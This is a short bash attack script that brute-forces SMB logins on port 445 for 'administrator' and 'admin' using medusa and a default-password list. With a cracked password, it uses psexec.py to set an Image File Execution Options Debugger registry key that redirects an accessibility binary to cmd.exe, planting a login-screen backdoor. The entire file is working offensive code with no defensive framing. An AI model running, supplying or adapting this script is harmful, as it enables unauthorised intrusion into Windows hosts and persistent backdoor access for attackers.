on_client/bruteforce/smb.sh
#!/bin/bash

WAIT=2
DPORT=445

function pwn(){
	echo "[*] try to activate backdoor"
	target="$1"
	user="$2"
	password="$3"
	psexec.py "$user:$password@$target" 'reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sechc.exe" /v Debugger /t reg_sz /d "windows\system32\cmd.exe"' > /dev/null
}

if nc -nw $WAIT $1 $DPORT < /dev/null 2> /dev/null; then
	echo '[*] bruteforcing smb'
	for user in administrator admin; do
		found=$(medusa -M smbnt -m PASS:PASSWORD -h $1 -u $user -P on_client/bruteforce/default_pass_for_services_unhash.txt | grep 'SUCCESS (ADMIN$ - Access Allowed)')
		if [ x"$found" != "x" ]; then
			led red on 2> /dev/null
			echo $found | grep 'SUCCESS' --color=auto
			password=$(echo $found|sed -rn 's/.*Password: (.*) \[SUCCESS.*\]/\1/p')
			pwn "$1" "$user" "$password"
			break
		fi
	done
fi
